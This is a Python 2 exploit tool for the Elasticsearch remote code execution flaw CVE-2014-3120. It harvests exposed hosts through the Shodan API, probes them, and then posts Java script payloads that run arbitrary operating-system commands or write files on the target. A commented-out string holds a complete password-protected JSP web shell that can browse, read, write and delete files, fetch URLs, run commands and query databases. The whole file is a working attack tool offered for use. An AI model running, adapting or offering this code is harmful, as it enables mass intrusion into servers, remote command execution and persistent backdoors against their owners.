#!/usr/bin/env python
# -*- coding: utf-8 -*-

# by heshang ha.cker@me.com
# update by coyote

import time
import shodan
import socket
import httplib
import urllib
import urllib2
import simplejson
import string
import sys
from optparse import OptionParser
#API_KEY = "" # YOUR_API_KEY

__author__ = 'heshang'

class shodanAPI:
    """
        使用 shodan 的API 进行查询
        shodan API 文档 :
            http://shodan.readthedocs.org/en/latest/index.html
        API KEY 创建 :
            http://www.shodanhq.com/api_doc
    """

    def __init__(self, api_key, timeout=3, query="you Know, for" ,page=1):
        self.hosts = []
        self.timeout = timeout
        self.query = query
        self.api_key = api_key
        self.page = page

    def _check(self):
        self._API()
        __result = []
        socket.setdefaulttimeout(self.timeout)
        for host in self.hosts:
            try:
                rs = urllib.urlopen('http://'+'%s'% host +':9200/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22t%22:{%22script%22:%22Integer.toHexString(31415926)%22}}}}')
                rs = rs.read()
                rs = simplejson.loads(rs)
                for t in rs['hits']['hits'][0]['fields']['t']:
                    t = t
            except Exception:
                continue
            else:
                print 'found vul host : %s' % host
                __result.append(host)
        return __result


    def _API(self):
        if not self.api_key:
            print "[ERROR] [ShodanAPI] please input your API KEY please use -k options"
            sys.exit(-1)
        else:
            api = shodan.Shodan(self.api_key) # Setup the api
            # for i in range(1,self.page):
            #     page = i
            #     print page
            try:
                results = api.search(self.query,self.page)
                print 'Results found: %s' % results['total']
                for service in results["matches"]:
                    self.hosts.append(str(service["ip_str"]))
                print self.hosts
                # for service in result['matches']:
                #     ip = service['ip_str']
                #     ip=str(ip)
                #     self.docheck(ip)
            # Loop through the matches and print each IP
            except shodan.APIError, e:
                print '[Error] [shodanAPI] %s and sleep 10 s' % e
                time.sleep(10)

    def result(self):
        return self._check()
        
class Exp:
    """
        Do ElasticSearch ExpLoit 
    """
    
    def __init__(self, host, port, path=""):
        self.host = host
        self.port = port
        #self.path = path
        #self.exp = ""

    def _post(self, exp):
        data = {
            "size": 1,
            "query": {
                "filtered": {
                    "query": {
                        "match_all": {}
                    }
                }
            },
            "script_fields": {
                "exp": {
                    "script": exp
                }
            }
        }
        data = simplejson.dumps(data)
        headers = {"User-agent":"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)",
                   "Accept": "ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Content-Type": "application/json; charset=utf-8",
                   "Connection": "keep-alive"}
        print "start post exp data"
        conn = httplib.HTTPConnection('%s' % self.host + ':' + '%d' % self.port)
        conn.request('POST', '/_search?source', data, headers)
        result = conn.getresponse().read()
        return result

    def exec_command(self,cmd):
        exp = ' import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"'+ cmd + '\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"|");}sb.toString();'
        #print "[LOGGING] [EXEC] %s " % exp
        rs = self._post(exp)
        return rs

    def save_file(self,path):
        upload='testtesttest'
        #upload='<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%><%!String Pwd="xxxxx";String cs="UTF-8";String EC(String s)throws Exception{return new String(s.getBytes("ISO-8859-1"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split("\r\n");Class.forName(x[0].trim());if(x[1].indexOf("jdbc:oracle")!=-1){return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);if(x.length>4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i<r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF="";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");for(int i=0; i<l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ +=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write(("->"+"|").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("|"+"<-").getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h="0123456789ABCDEF";File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j<z.length; j++){HH(s+"/"+z[j].getName(),d+"/"+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+"\r\n");}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+"\t");}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split("\r\n");ResultSet r=c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null,"%",new String[]{"TABLE"});while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("select * from "+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+" ("+d.getColumnTypeName(i)+")\t");}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i <=n; i++){sb.append(d.getColumnName(i)+"\t|\t");}sb.append("\r\n");if(q.indexOf("--f:")!=-1){File file=new File(p);if(q.indexOf("-to:")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:")+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i<=n;i++){if(q.indexOf("--f:")!=-1){bw.write(r.getObject(i)+""+"\t");bw.flush();}else{sb.append(r.getObject(i)+""+"\t|\t");}}if(bw!=null){bw.newLine();}sb.append("\r\n");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append("Result\t|\t\r\n");try{m.executeUpdate(q);sb.append("Execute Successfully!\t|\t\r\n");}catch(Exception ee){sb.append(ee.toString()+"\t|\t\r\n");}}m.close();c.close();}%><%cs=request.getParameter("z0")!=null?request.getParameter("z0")+"":cs;response.setContentType("text/html");response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer("");try{String Z=EC(request.getParameter(Pwd)+"");String z1=EC(request.getParameter("z1")+"");String z2=EC(request.getParameter("z2")+"");sb.append("->"+"|");String s=request.getSession().getServletContext().getRealPath("/");if(Z.equals("A")){sb.append(s+"\t");if(!s.substring(0,1).equals("/")){AA(sb);}}else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}else if(Z.equals("D")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}else if(Z.equals("G")){GG(z1,z2);sb.append("1");}else if(Z.equals("H")){HH(z1,z2);sb.append("1");}else if(Z.equals("I")){II(z1,z2);sb.append("1");}else if(Z.equals("J")){JJ(z1);sb.append("1");}else if(Z.equals("K")){KK(z1,z2);sb.append("1");}else if(Z.equals("L")){LL(z1,z2);sb.append("1");}else if(Z.equals("M")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}else if(Z.equals("O")){OO(z1,sb);}else if(Z.equals("P")){PP(z1,sb);}else if(Z.equals("Q")){QQ(cs,z1,z2,sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\","/")+"images/");}}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"<-");out.print(sb.toString());%>'
        exp='import java.util.*;\nimport java.io.*;\nFile f = new File(\"' + path + '\");if(f.exists()){\"exists\".toString();}BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"'+upload+'\");bw.flush();bw.close();if(f.exists()){\"success\".toString();}'
        #print "[LOGGING] [SAVE] %s " % exp
        rs = self._post(exp)
        return rs

def main(argv):
    options = OptionParser(
        usage='\n %prog host [options]  or \n %prog -s [options] or \n %prog -f FILEPATH [options]',
        description="Elasticsearch vul found Tool\n"+ 
                    "Elasticsearch command exec exploit(CVE-2014-3120)\n" +
                    "Write by ha.cker@me.com\n" + 
                    "This tool use shodan api to search the vul host\n" +
                    "WARNING : this tool only support host ip ,can not support CIDR and network ip \n"
    )
    options.add_option('-f', '--hosts-file', dest="hosts_file", help="Scan hosts from FILE", metavar="FILE")
    options.add_option('-s', '--shodan', action="store_true", help="Use Shodan API to get hosts,default is false", default=False)
    options.add_option('-p', '--port', type='int', default='9200',help='The elasticsearch port (default:9200)')
    options.add_option('-c', '--cmd', type='str', default='whoami', help='command to test (default:whoami)')
    options.add_option('-P', '--path',type='str', default='', help='Upload file\'s path')
    options.add_option('-k', '--api-key',type='str',default='',help='Shodan API KEY string')

    opts, args = options.parse_args(argv)
    hosts = []
    if opts.shodan:
        print "start shodan search & exp"
        ck = shodanAPI(opts.api_key)
        hosts = ck.result()
    elif not opts.shodan and not opts.hosts_file:
        if args:
            print "start host exp"
            hosts = [args[0]]
    elif opts.hosts_file:
        print "start hosts file & exp"
        hosts = [file.strip() for file in open(options.hosts_file, 'r')]
    if not hosts:
        options.print_help()
        return
    for host in hosts:
        exp = Exp(host, opts.port)
        if opts.path:
            res = exp.save_file(opts.path)
            res = simplejson.loads(res)
            res = res['hits']['hits']
            if len(res) > 0:
                res = res[0]['fields']['exp']
                print res
            else:
                print "[ERROR] [EXP] failed to exp host:%s" % host
        elif not opts.path:
            res = exp.exec_command(opts.cmd)
            res = simplejson.loads(res)
            res = res['hits']['hits']            
            if len(res) > 0:
                res = res[0]['fields']['exp']
                s = '%s' % res
                s = s.split('|')
                for i in s:
                    print i#.decode("unicode_escape")
            else:
                print "[ERROR] [EXP] failed to exp host:%s" % host
                
if __name__ == "__main__":
    #try:
        main(sys.argv[1:])
    # except KeyboardInterrupt:
    #     print "Scan terminated\n"
